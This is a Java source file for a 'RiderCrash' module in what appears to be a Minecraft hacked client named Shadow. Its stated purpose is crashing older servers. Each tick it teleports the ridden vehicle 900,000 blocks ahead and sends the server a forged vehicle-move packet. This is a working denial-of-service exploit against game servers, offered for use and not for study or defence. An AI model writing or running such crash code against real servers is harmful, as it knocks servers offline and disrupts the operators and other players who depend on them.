package net.shadow.feature.module;

import net.minecraft.entity.Entity;
import net.minecraft.entity.Entity.RemovalReason;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;

public class BoatSuperCrash extends Module {
    public BoatSuperCrash() {
        super("RiderCrash", "crash with a entity on old serbre", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        Entity ridingEntity = Shadow.c.player.getVehicle();
        if (ridingEntity == null) {
            return;
        }
        Shadow.c.world.removeEntity(ridingEntity.getId(), RemovalReason.CHANGED_DIMENSION);
        Vec3d forward = Vec3d.fromPolar(0, Shadow.c.player.getYaw()).normalize().multiply(900000.0F);
        ridingEntity.updatePosition(Shadow.c.player.getX() + forward.x, Shadow.c.player.getY(), Shadow.c.player.getZ() + forward.z);
        Shadow.c.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
    }

    @Override
    public void onRender() {

    }
}
